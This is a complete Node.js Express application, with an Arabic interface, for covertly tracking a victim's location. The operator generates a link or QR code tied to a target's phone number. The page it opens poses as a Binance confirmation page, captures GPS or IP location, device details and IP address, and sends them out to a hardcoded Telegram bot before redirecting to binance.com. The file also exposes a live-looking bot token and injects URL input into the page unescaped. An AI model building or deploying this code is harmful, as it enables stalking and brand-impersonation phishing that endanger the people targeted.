const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== ⚙️ إعداداتك الشخصية ==========
const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y'; // توكنك ✅
const TELEGRAM_CHAT_ID = '8391968596'; // أيديك ✅
const REDIRECT_URL = 'https://www.binance.com/en'; // موقع التوجيه
const BASE_URL = 'https://location2026-2.onrender.com'; // رابط موقعك

// ========== قاعدة البيانات ==========
let locations = [];

// ========== Middleware ==========
app.use(express.json());
app.use(express.static('public'));

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام التتبع الذكي</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .container { max-width: 1000px; margin: auto; }
                h1 { color: #00ff88; text-align: center; }
                .box { background: #1a1a2e; padding: 25px; border-radius: 15px; margin: 20px 0; border: 1px solid #00ff88; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; margin: 10px; display: inline-block; }
                .input-group { margin: 20px 0; text-align: center; }
                input { padding: 12px; width: 350px; border-radius: 8px; border: 2px solid #00ff88; background: #0f0f23; color: white; font-size: 16px; text-align: center; }
                .link-display { background: #0f0f23; padding: 15px; border-radius: 10px; margin: 20px 0; word-break: break-all; border: 1px solid #00ff88; }
                .qr-container { text-align: center; margin: 30px 0; padding: 20px; background: rgba(0,255,136,0.1); border-radius: 15px; }
                .steps { background: #1a1a2e; padding: 20px; border-radius: 10px; margin: 30px 0; }
                .step { display: flex; align-items: center; margin: 15px 0; }
                .step-number { background: #00ff88; color: #001a0f; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-left: 15px; font-weight: bold; }
                .status { background: rgba(0,255,136,0.1); padding: 15px; border-radius: 10px; margin: 20px 0; text-align: center; border: 1px solid #00ff88; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام التتبع الذكي</h1>
                
                <div class="status">
                    <p>✅ النظام يعمل بشكل صحيح | البوت: @Arab9919_bot | الأيدي: ${TELEGRAM_CHAT_ID}</p>
                    <p>📊 تم تسجيل: <strong>${locations.length}</strong> موقع</p>
                </div>
                
                <div class="box">
                    <h3>📌 كيف تنشئ رابط تتبع:</h3>
                    <div class="input-group">
                        <input type="text" id="targetPhone" placeholder="أدخل رقم الهدف (مثال: 00966512345678)">
                        <br><br>
                        <button onclick="generateLink()" class="btn">🎯 إنشاء رابط التتبع</button>
                    </div>
                    
                    <div id="result" style="display: none; margin-top: 30px;">
                        <h4>🔗 الرابط الذي ترسله للهدف:</h4>
                        <div class="link-display" id="trackingLink"></div>
                        
                        <div class="qr-container">
                            <h4>📱 باركود الرابط:</h4>
                            <img id="qrCode" src="" alt="QR Code" style="width: 250px; height: 250px; border: 5px solid white; border-radius: 15px; margin: 20px 0;">
                            <br>
                            <button onclick="copyLink()" class="btn">📋 نسخ الرابط</button>
                            <button onclick="downloadQR()" class="btn">📥 تحميل الباركود</button>
                            <button onclick="sendTest()" class="btn">🔗 تجربة الرابط</button>
                        </div>
                    </div>
                </div>
                
                <div class="steps">
                    <h3>🎯 كيف تعمل العملية:</h3>
                    <div class="step">
                        <div class="step-number">1</div>
                        <span>تدخل رقم الهدف وتنشئ الرابط/الباركود</span>
                    </div>
                    <div class="step">
                        <div class="step-number">2</div>
                        <span>ترسل الرابط أو الباركود للهدف (واتساب، تلجرام، الخ)</span>
                    </div>
                    <div class="step">
                        <div class="step-number">3</div>
                        <span>عندما يضغط الهدف، يحدد موقعه بدقة عالية</span>
                    </div>
                    <div class="step">
                        <div class="step-number">4</div>
                        <span>يصلك إشعار على التلجرام بموقع الهدف بالضبط</span>
                    </div>
                    <div class="step">
                        <div class="step-number">5</div>
                        <span>يتم توجيه الهدف لموقع Binance (أو أي موقع تريد)</span>
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 40px;">
                    <a href="/all-links" class="btn">📋 جميع الروابط</a>
                    <a href="/results" class="btn">📊 النتائج (${locations.length})</a>
                    <a href="/map" class="btn">🗺️ الخريطة</a>
                    <a href="/test-telegram" class="btn">🤖 اختبار التلجرام</a>
                    <a href="/admin" class="btn">⚙️ الإعدادات</a>
                </div>
                
                <div style="text-align: center; margin-top: 50px; font-size: 12px; color: #666;">
                    <p>© 2024 نظام التتبع الذكي | إصدار 4.0 | البوت: @Arab9919_bot</p>
                </div>
            </div>
            
            <script>
                function generateLink() {
                    const phone = document.getElementById('targetPhone').value.trim();
                    if (!phone) {
                        alert('⚠️ أدخل رقم الهدف أولاً');
                        return;
                    }
                    
                    const link = '${BASE_URL}/track/' + encodeURIComponent(phone);
                    document.getElementById('trackingLink').textContent = link;
                    document.getElementById('qrCode').src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&format=png&data=' + encodeURIComponent(link);
                    document.getElementById('result').style.display = 'block';
                    
                    // حفظ في localStorage
                    const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
                    if (!links.includes(phone)) {
                        links.push(phone);
                        localStorage.setItem('trackingLinks', JSON.stringify(links));
                    }
                }
                
                function copyLink() {
                    const link = document.getElementById('trackingLink').textContent;
                    navigator.clipboard.writeText(link).then(() => {
                        alert('✅ تم نسخ الرابط إلى الحافظة');
                    });
                }
                
                function downloadQR() {
                    const link = document.getElementById('trackingLink').textContent;
                    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=' + encodeURIComponent(link);
                    const a = document.createElement('a');
                    a.href = qrUrl;
                    a.download = 'QR_' + document.getElementById('targetPhone').value + '.png';
                    a.click();
                }
                
                function sendTest() {
                    const link = document.getElementById('trackingLink').textContent;
                    window.open(link, '_blank');
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع الذكي ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>Binance - تأكيد العملية</title>
            <script>
                // البيانات الأساسية
                const userId = '${userId}';
                let locationData = {};
                
                // 1. الحصول على الموقع الجغرافي بدقة عالية
                async function getAccurateLocation() {
                    return new Promise((resolve) => {
                        if (navigator.geolocation) {
                            // محاولة مع دقة عالية
                            navigator.geolocation.getCurrentPosition(
                                async (position) => {
                                    // نجاح - موقع دقيق
                                    locationData = {
                                        lat: position.coords.latitude,
                                        lon: position.coords.longitude,
                                        accuracy: position.coords.accuracy,
                                        source: 'gps_high_accuracy',
                                        success: true
                                    };
                                    resolve(true);
                                },
                                async (error) => {
                                    // فشل GPS، نستخدم IP
                                    await getLocationByIP();
                                    resolve(false);
                                },
                                {
                                    enableHighAccuracy: true,
                                    timeout: 10000,
                                    maximumAge: 0
                                }
                            );
                        } else {
                            // المتصفح لا يدعم
                            await getLocationByIP();
                            resolve(false);
                        }
                    });
                }
                
                // 2. الحصول على الموقع عبر IP
                async function getLocationByIP() {
                    try {
                        const response = await fetch('https://geolocation-db.com/json/');
                        const data = await response.json();
                        
                        if (data.latitude && data.longitude) {
                            locationData = {
                                lat: parseFloat(data.latitude),
                                lon: parseFloat(data.longitude),
                                accuracy: 5000,
                                source: 'ip_geolocation',
                                city: data.city,
                                country: data.country_name,
                                ip: data.IPv4,
                                success: true
                            };
                        } else {
                            // استخدام موقع افتراضي (الرياض)
                            locationData = {
                                lat: 24.7136,
                                lon: 46.6753,
                                accuracy: 100000,
                                source: 'default_location',
                                city: 'الرياض',
                                country: 'السعودية',
                                success: false
                            };
                        }
                    } catch (error) {
                        locationData = {
                            lat: 24.7136,
                            lon: 46.6753,
                            accuracy: 100000,
                            source: 'error_default',
                            success: false
                        };
                    }
                }
                
                // 3. إرسال البيانات للخادم
                async function sendLocationToServer() {
                    try {
                        const response = await fetch('/api/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                id: userId,
                                latitude: locationData.lat,
                                longitude: locationData.lon,
                                accuracy: locationData.accuracy,
                                source: locationData.source,
                                city: locationData.city,
                                country: locationData.country,
                                success: locationData.success,
                                timestamp: new Date().toISOString(),
                                userAgent: navigator.userAgent,
                                platform: navigator.platform
                            })
                        });
                        
                        const result = await response.json();
                        console.log('✅ تم الحفظ:', result);
                        
                        // تحديث حالة النجاح
                        if (locationData.success) {
                            document.getElementById('status').innerHTML += '<br>✅ تم تحديد موقعك بدقة عالية';
                        } else {
                            document.getElementById('status').innerHTML += '<br>⚠️ تم استخدام موقع تقديري';
                        }
                    } catch (error) {
                        console.error('❌ خطأ في الإرسال:', error);
                    }
                }
                
                // 4. عد تنازلي للتوجيه
                function startCountdown() {
                    let seconds = 5;
                    const countdownElement = document.getElementById('countdown');
                    
                    const timer = setInterval(() => {
                        countdownElement.textContent = seconds;
                        seconds--;
                        
                        if (seconds < 0) {
                            clearInterval(timer);
                            document.getElementById('finalStatus').textContent = '✅ تم إكمال العملية بنجاح!';
                            setTimeout(() => {
                                window.location.href = '${REDIRECT_URL}';
                            }, 1000);
                        }
                    }, 1000);
                }
                
                // 5. العملية الرئيسية
                async function mainProcess() {
                    // تحديث الحالة
                    document.getElementById('status').innerHTML = '📍 جاري تحديد موقعك...';
                    
                    // الحصول على الموقع
                    const accurate = await getAccurateLocation();
                    
                    // إرسال البيانات
                    document.getElementById('status').innerHTML += '<br>📡 جاري إرسال البيانات...';
                    await sendLocationToServer();
                    
                    // بدء العد التنازلي
                    startCountdown();
                }
                
                // بدء العملية عند تحميل الصفحة
                window.onload = mainProcess;
            </script>
            <style>
                body {
                    font-family: Arial;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #0f2027 0%, #203a43 100%);
                    color: white;
                    text-align: center;
                    padding: 20px;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(20px);
                    padding: 40px;
                    border-radius: 25px;
                    max-width: 600px;
                    width: 90%;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                }
                .logo {
                    font-size: 70px;
                    margin-bottom: 20px;
                    animation: pulse 2s infinite;
                }
                @keyframes pulse {
                    0%, 100% { transform: scale(1); }
                    50% { transform: scale(1.1); }
                }
                .countdown {
                    font-size: 80px;
                    color: #00ff88;
                    margin: 20px 0;
                    text-shadow: 0 0 20px #00ff88;
                }
                .loader {
                    width: 60px;
                    height: 60px;
                    border: 5px solid rgba(255,255,255,0.3);
                    border-top: 5px solid #00ff88;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .status-box {
                    background: rgba(0, 0, 0, 0.3);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 20px 0;
                    text-align: right;
                    font-size: 14px;
                    line-height: 1.8;
                    max-height: 200px;
                    overflow-y: auto;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">₿</div>
                <h1>Binance - تأكيد العملية</h1>
                <p>جاري التحقق من بياناتك وتأكيد العملية...</p>
                
                <div class="countdown" id="countdown">5</div>
                <p>سيتم توجيهك خلال <span id="countdown">5</span> ثوانٍ</p>
                
                <div class="loader"></div>
                
                <div class="status-box" id="status">
                    ⏳ بدء عملية التحقق...
                </div>
                
                <div id="finalStatus" style="color: #00ff88; font-weight: bold; margin: 20px 0;">
                    جاري إكمال العملية...
                </div>
                
                <div style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
                    <p>رقم العملية: #${userId} | ${new Date().toLocaleString('ar-SA')}</p>
                    <p>© Binance 2024. جميع الحقوق محفوظة.</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع وإرسال تلجرام ==========
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA'),
            timestamp: Date.now()
        };
        
        locations.push(locationData);
        
        // إرسال إشعار للتلجرام
        const telegramSent = await sendTelegramNotification(locationData);
        
        console.log('📍 موقع جديد:', {
            id: locationData.id,
            location: `${locationData.latitude}, ${locationData.longitude}`,
            accuracy: locationData.accuracy,
            source: locationData.source,
            telegram: telegramSent ? '✅' : '❌'
        });
        
        res.json({ 
            success: true, 
            message: 'تم حفظ الموقع',
            telegram_sent: telegramSent,
            count: locations.length 
        });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== دالة إرسال تلجرام ==========
async function sendTelegramNotification(locationData) {
    try {
        const message = `
📍 **موقع جديد تم تسجيله**

👤 **رقم المستخدم:** ${locationData.id}
📌 **الإحداثيات:** ${locationData.latitude}, ${locationData.longitude}
🎯 **الدقة:** ${locationData.accuracy} متر
📡 **المصدر:** ${locationData.source}
${locationData.city ? `🏙️ **المدينة:** ${locationData.city}` : ''}
⏰ **الوقت:** ${locationData.time}
🌐 **IP:** ${locationData.ip || 'غير معروف'}
${locationData.success === false ? '⚠️ **ملاحظة:** الموقع تقديري وليس دقيقاً' : '✅ **ملاحظة:** الموقع دقيق'}

🗺️ [فتح على Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
        `;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: false
            })
        });
        
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('❌ خطأ في التلجرام:', error.message);
        return false;
    }
}

// ========== صفحة جميع الروابط ==========
app.get('/all-links', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📋 جميع الروابط</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .links-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-top: 30px; }
                .link-card { background: #1a1a2e; padding: 20px; border-radius: 15px; border: 1px solid #00ff88; }
                .btn { background: #00cc66; color: white; padding: 8px 15px; border-radius: 5px; text-decoration: none; font-size: 14px; margin: 5px; }
            </style>
        </head>
        <body>
            <h1>📋 جميع الروابط المولدة</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            
            <div class="links-grid">
                ${uniqueIds.map(id => {
                    const url = `${BASE_URL}/track/${id}`;
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(url)}`;
                    return `
                        <div class="link-card">
                            <p><strong>🔢 الرقم:</strong> ${id}</p>
                            <p><strong>🔗 الرابط:</strong><br><span style="font-size: 12px; color: #00ff88;">${url}</span></p>
                            <img src="${qrUrl}" alt="QR" style="width: 150px; height: 150px; margin: 10px 0; border: 3px solid white; border-radius: 10px;">
                            <br>
                            <a href="${url}" target="_blank" class="btn">🔗 فتح الرابط</a>
                            <button onclick="copyToClipboard('${url}')" class="btn" style="background: #667eea;">📋 نسخ</button>
                        </div>
                    `;
                }).join('')}
            </div>
            
            <script>
                function copyToClipboard(text) {
                    navigator.clipboard.writeText(text).then(() => {
                        alert('✅ تم نسخ الرابط');
                    });
                }
            </script>
        </body>
        </html>
    `);
});

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 15px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 10px; }
                .accuracy-badge { padding: 3px 10px; border-radius: 10px; font-size: 12px; }
                .high { background: #00cc66; color: white; }
                .medium { background: #ffcc00; color: black; }
                .low { background: #ff4444; color: white; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            
            <table style="margin-top: 30px;">
                <tr>
                    <th>رقم الهاتف</th>
                    <th>الإحداثيات</th>
                    <th>الدقة</th>
                    <th>المصدر</th>
                    <th>الوقت</th>
                    <th>الخريطة</th>
                </tr>
                ${locations.slice().reverse().map(loc => {
                    let accuracyClass = 'low';
                    if (loc.accuracy < 100) accuracyClass = 'high';
                    else if (loc.accuracy < 1000) accuracyClass = 'medium';
                    
                    return `
                        <tr>
                            <td><strong>${loc.id}</strong></td>
                            <td>${loc.latitude}, ${loc.longitude}</td>
                            <td><span class="accuracy-badge ${accuracyClass}">${loc.accuracy} متر</span></td>
                            <td>${loc.source || 'مباشر'}</td>
                            <td>${loc.time}</td>
                            <td><a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88;">👁️ عرض</a></td>
                        </tr>
                    `;
                }).join('')}
            </table>
        </body>
        </html>
    `);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 600px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        const marker = L.marker([loc.latitude, loc.longitude]).addTo(map);
                        marker.bindPopup('<b>رقم: ' + loc.id + '</b><br>الوقت: ' + loc.time + '<br>الدقة: ' + loc.accuracy + ' متر');
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// ========== اختبار التلجرام ==========
app.get('/test-telegram', async (req, res) => {
    try {
        const testMessage = `
🤖 **اختبار النظام**

✅ البوت: @Arab9919_bot
🆔 الأيدي: ${TELEGRAM_CHAT_ID}
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
🌐 الموقع: ${BASE_URL}

🎉 إذا وصلتك هذه الرسالة، النظام يعمل بشكل ممتاز!
        `;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: testMessage,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        
        res.send(`
            <html dir="rtl">
            <body style="font-family: Arial; padding: 50px; text-align: center; background: ${data.ok ? '#0f0f23' : '#ff4444'}; color: white;">
                <h1>${data.ok ? '✅ نجاح' : '❌ خطأ'}</h1>
                <pre style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 10px; text-align: left;">${JSON.stringify(data, null, 2)}</pre>
                <a href="/" style="background: #00cc66; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; margin-top: 30px; display: inline-block;">🏠 العودة للرئيسية</a>
            </body>
            </html>
        `);
    } catch (error) {
        res.send(`<h1>❌ خطأ: ${error.message}</h1>`);
    }
});

// ========== صفحة الإعدادات ==========
app.get('/admin', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <title>⚙️ الإعدادات</title>
            <style>
                body { font-family: Arial; padding: 30px; background: #0f0f23; color: white; }
                .card { background: #1a1a2e; padding: 25px; border-radius: 15px; margin: 20px 0; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>⚙️ إعدادات النظام</h1>
            
            <div class="card">
                <h3>🤖 إعدادات التلجرام:</h3>
                <p>• البوت: @Arab9919_bot</p>
                <p>• التوكن: ${TELEGRAM_TOKEN.substring(0, 10)}...${TELEGRAM_TOKEN.substring(TELEGRAM_TOKEN.length - 5)}</p>
                <p>• أيدي الشات: ${TELEGRAM_CHAT_ID}</p>
                <a href="/test-telegram" class="btn">اختبار التلجرام</a>
            </div>
            
            <div class="card">
                <h3>📊 إحصائيات النظام:</h3>
                <p>• المواقع المسجلة: ${locations.length}</p>
                <p>• الروابط المولدة: ${[...new Set(locations.map(l => l.id))].length}</p>
                <p>• آخر موقع: ${locations.length > 0 ? locations[locations.length-1].time : 'لا يوجد'}</p>
                <a href="/results" class="btn">عرض النتائج</a>
                <a href="/map" class="btn">عرض الخريطة</a>
            </div>
            
            <div class="card">
                <h3>🔗 إعدادات التوجيه:</h3>
                <p>• رابط التوجيه: ${REDIRECT_URL}</p>
                <p>• وقت التوجيه: 5 ثواني</p>
                <p>• دقة الموقع: GPS عالي الدقة + IP احتياطي</p>
            </div>
            
            <a href="/" class="btn" style="background: #667eea;">🏠 الرئيسية</a>
        </body>
        </html>
    `);
});

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    ============================================
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    
    🤖 التلجرام: ✅ متصل (@Arab9919_bot)
    📍 التتبع: ✅ نشط (GPS + IP)
    📱 الباركود: ✅ نشط
    🗺️ الخريطة: ✅ نشط
    
    ⚡ النظام جاهز للاستخدام!
    ============================================
    `);
});
